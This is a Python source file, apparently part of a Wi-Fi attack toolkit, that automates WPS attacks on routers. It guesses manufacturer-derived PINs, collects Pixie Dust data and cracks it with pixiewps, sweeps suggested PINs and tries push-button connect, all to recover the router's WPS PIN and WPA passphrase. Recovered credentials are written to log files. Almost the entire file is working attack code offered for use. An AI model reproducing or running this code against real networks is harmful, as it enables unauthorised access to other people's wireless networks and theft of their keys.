#!/usr/bin/env python3
"""
Attack Module v3 - Direct WPS Engine (no ose.py needed)
Uses WpsEngine directly instead of running ose.py as subprocess
"""

import sys
import time
from datetime import datetime
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent))
from modules.wps_pins import suggest_pins, get_best_pin, detect_manufacturer
from modules.wpa_engine import WpsEngine

LOGS_DIR = Path(__file__).parent.parent / "logs"
LOGS_DIR.mkdir(parents=True, exist_ok=True)


def analyze_target(bssid, wps_version="", wps_locked="Unknown"):
    """Analyze target and return smart PIN suggestions"""
    manufacturer, algo, confidence = detect_manufacturer(bssid)
    pins = suggest_pins(bssid, wps_version, wps_locked)

    analysis = {
        "bssid": bssid,
        "manufacturer": manufacturer or "Unknown",
        "algorithm": algo or "generic",
        "confidence": confidence,
        "pins": pins[:10],
        "best_pin": pins[0]["pin"] if pins else "12345670",
        "total_pins": len(pins),
    }

    return analysis


def run_wps_attack(interface, attack_type, bssid=None, pin=None, callback=None,
                   skip_pins=None):
    """
    Run WPS attack using direct WpsEngine (no ose.py).

    Attack types:
      - "pin": WPS PIN attack with specific PIN
      - "pixie": Pixie Dust data collection + crack
      - "bruteforce": Controlled sweep of suggested PINs via WpsEngine
      - "pbc": Push Button Connect
      - "smart": Uses best PIN from analysis
    """
    # Smart PIN selection
    if attack_type == "smart" and bssid and not pin:
        analysis = analyze_target(bssid)
        pin = analysis["best_pin"]
        if callback:
            callback("[*] Smart PIN selected: " + pin +
                     " (" + analysis["pins"][0]["method"] + ")")

    found_pin = None
    found_psk = None
    output_lines = []
    attempt_records = []
    skipped_pins = set(skip_pins or [])
    log_file = LOGS_DIR / "attack_{ts}.log".format(
        ts=datetime.now().strftime("%Y%m%d_%H%M%S"))

    def cb(msg):
        output_lines.append(msg)
        if callback:
            callback(msg)

    # Create and start engine
    engine = WpsEngine(interface)
    ok, msg = engine.start()

    if not ok:
        cb("[!] Engine error: " + msg)
        return {
            "pin": None, "psk": None, "status": "error",
            "output": msg, "log_file": str(log_file), "attempts": [],
        }

    engine.callback = cb

    # Write engine start to log
    with open(log_file, "w") as f:
        f.write("[*] Attack started: {t}\n".format(
            t=datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
        f.write("[*] Interface: {i} | Type: {a} | BSSID: {b}\n".format(
            i=interface, a=attack_type, b=bssid or "any"))

    try:
        if attack_type == "pin" and pin:
            cb("[*] Trying PIN: " + pin)
            started = time.time()
            result = engine.wps_pin_attack(bssid, pin, timeout=60)
            elapsed = time.time() - started
            attempt_records.append({
                "pin": pin,
                "status": result.get("status", "unknown"),
                "response": result.get("output", "")[-500:],
                "duration": elapsed,
            })
            found_pin = result.get("pin")
            found_psk = result.get("psk")

        elif attack_type == "pixie":
            cb("[*] Collecting Pixie Dust data...")
            result = engine.collect_pixie_data(bssid, max_attempts=8)

            # Try pixiewps if we have enough data
            pixie = result.get("pixie_data", {})
            collected = sum(1 for k in ['PKE', 'PKR', 'E_NONCE', 'R_NONCE',
                                        'AUTHKEY', 'E_HASH1', 'E_HASH2']
                           if pixie.get(k))

            if collected >= 4 and pixie.get("PKE"):
                cb("[*] Running pixiewps with {c}/7 data fields...".format(c=collected))
                import shutil
                if shutil.which("pixiewps"):
                    import subprocess
                    cmd = [
                        "pixiewps",
                        "--pke", pixie.get("PKE", ""),
                        "--pkr", pixie.get("PKR", ""),
                        "--e-hash1", pixie.get("E_HASH1", ""),
                        "--e-hash2", pixie.get("E_HASH2", ""),
                        "--authkey", pixie.get("AUTHKEY", ""),
                        "--e-nonce", pixie.get("E_NONCE", ""),
                        "--r-nonce", pixie.get("R_NONCE", ""),
                        "--e-bssid", bssid.replace(":", ""),
                        "--mode", "1,2,3,4,5",
                    ]
                    # Remove empty args
                    cmd = [c for c in cmd if c and not c.isspace()]
                    try:
                        r = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
                        output_lines.append(r.stdout)
                        for line in r.stdout.split("\n"):
                            if "WPS pin" in line and "[+]" in line:
                                extracted_pin = line.split(":")[-1].strip()
                                if extracted_pin and extracted_pin != "<empty>":
                                    found_pin = extracted_pin
                                    cb("[+] PIXIEWPS PIN: " + found_pin)
                                    # Verify the PIN
                                    cb("[*] Verifying PIN: " + found_pin)
                                    verify_started = time.time()
                                    verify_result = engine.wps_pin_attack(bssid, found_pin, timeout=45)
                                    verify_elapsed = time.time() - verify_started
                                    attempt_records.append({
                                        "pin": found_pin,
                                        "status": verify_result.get("status", "unknown"),
                                        "response": verify_result.get("output", "")[-500:],
                                        "duration": verify_elapsed,
                                    })
                                    if verify_result.get("status") == "success":
                                        found_pin = verify_result.get("pin")
                                        found_psk = verify_result.get("psk")
                                        cb("[+] PIN VERIFIED!")
                    except Exception as e:
                        cb("[!] pixiewps error: " + str(e))
                else:
                    cb("[!] pixiewps not installed")
            else:
                cb("[!] Not enough data for pixiewps ({c}/7)".format(c=collected))

            found_pin = found_pin or result.get("pin")
            found_psk = found_psk or result.get("psk")

        elif attack_type == "bruteforce":
            # Controlled high-priority sweep, not an exhaustive online attack.
            analysis = analyze_target(bssid)
            all_pins = []
            for pin_info in analysis["pins"]:
                candidate = pin_info["pin"]
                if candidate not in all_pins:
                    all_pins.append(candidate)
            pending_pins = [candidate for candidate in all_pins
                            if candidate not in skipped_pins]
            cb("[*] Suggested PIN sweep: {pending} pending, {skipped} already tried".format(
                pending=len(pending_pins),
                skipped=len(all_pins) - len(pending_pins),
            ))
            for i, try_pin in enumerate(pending_pins, 1):
                cb("[{i}/{n}] Trying PIN: {p}".format(
                    i=i, n=len(pending_pins), p=try_pin
                ))
                started = time.time()
                result = engine.wps_pin_attack(bssid, try_pin, timeout=30)
                elapsed = time.time() - started
                attempt_records.append({
                    "pin": try_pin,
                    "status": result.get("status", "unknown"),
                    "response": result.get("output", "")[-500:],
                    "duration": elapsed,
                })
                if result.get("status") == "success":
                    found_pin = result.get("pin")
                    found_psk = result.get("psk")
                    cb("[+] SUCCESS! PIN: {p} PSK: {k}".format(
                        p=found_pin, k=found_psk))
                    break
                elif result.get("status") == "locked":
                    cb("[!] AP is LOCKED. Stopping brute force.")
                    break
                elif result.get("is_locked"):
                    cb("[!] AP locked after this attempt.")
                    break

        elif attack_type == "pbc":
            cb("[*] WPS PBC - press the button on the router!")
            result = engine.wps_pbc_attack(bssid, timeout=120)
            found_pin = result.get("pin")
            found_psk = result.get("psk")

        else:
            # Default: PIN attack
            if not pin:
                pin = "12345670"
            cb("[*] Trying PIN: " + pin)
            started = time.time()
            result = engine.wps_pin_attack(bssid, pin, timeout=60)
            elapsed = time.time() - started
            attempt_records.append({
                "pin": pin,
                "status": result.get("status", "unknown"),
                "response": result.get("output", "")[-500:],
                "duration": elapsed,
            })
            found_pin = result.get("pin")
            found_psk = result.get("psk")

    except KeyboardInterrupt:
        cb("[!] Interrupted by user")
        result = engine._result() if hasattr(engine, '_result') else {}

    finally:
        engine.stop()

    # Build result
    status = "success" if (found_pin and found_psk) else (
        "pin_found" if found_pin else "completed"
    )

    # Log output
    with open(log_file, "a") as f:
        f.write("\n" + "=" * 50 + "\n")
        f.write("Status: {s}\n".format(s=status))
        if found_pin:
            f.write("PIN: " + found_pin + "\n")
        if found_psk:
            f.write("PSK: " + found_psk + "\n")
        for line in output_lines[-20:]:
            f.write(line + "\n")

    return {
        "pin": found_pin,
        "psk": found_psk,
        "status": status,
        "output": "\n".join(output_lines),
        "log_file": str(log_file),
        "attempts": attempt_records,
    }


def run_smart_attack(interface, bssid, wps_version="",
                     wps_locked="Unknown", callback=None):
    """
    Smart attack sequence using direct WpsEngine:
    1. Try best algorithm PIN first
    2. If locked -> wait and retry
    3. Try Pixie Dust
    4. Fall back to top 3 PINs
    """

    analysis = analyze_target(bssid, wps_version, wps_locked)
    combined_attempts = []

    if callback:
        callback("\n" + "=" * 50)
        callback("SMART ATTACK ANALYSIS")
        callback("=" * 50)
        callback("Target:   " + bssid)
        callback("MFR:      " + str(analysis["manufacturer"]))
        callback("Algorithm:" + str(analysis["algorithm"]))
        callback("Best PIN: " + str(analysis["best_pin"]))
        callback("Confidence: " + str(analysis["confidence"]) + "%")
        callback("=" * 50)

    # Step 1: Try best PIN
    best_pin = analysis["best_pin"]
    if callback:
        callback("\n[*] Step 1: Trying best PIN: " + best_pin)

    result = run_wps_attack(interface, "pin", bssid, best_pin, callback)
    combined_attempts.extend(result.get("attempts", []))

    if result["status"] == "success":
        result["attempts"] = combined_attempts
        return result

    # Step 2: Try Pixie Dust
    if callback:
        callback("\n[*] Step 2: Trying Pixie Dust...")

    result = run_wps_attack(interface, "pixie", bssid, None, callback)
    combined_attempts.extend(result.get("attempts", []))

    if result["status"] == "success":
        result["attempts"] = combined_attempts
        return result

    # Step 3: Try top 3 algorithm PINs
    for i, pin_info in enumerate(analysis["pins"][:3], 1):
        if pin_info["pin"] == best_pin:
            continue  # Already tried
        if callback:
            msg = "\n[*] Step 3.{i}: Trying {pin} ({method})".format(
                i=i, pin=pin_info["pin"], method=pin_info["method"])
            callback(msg)
        result = run_wps_attack(interface, "pin", bssid, pin_info["pin"], callback)
        combined_attempts.extend(result.get("attempts", []))
        if result["status"] == "success":
            result["attempts"] = combined_attempts
            return result

    if callback:
        callback("\n[*] Smart attack completed. No credentials found.")
        callback("[*] Suggested PINs exhausted. Check WPS lock/rate limiting.")

    result["attempts"] = combined_attempts
    return result
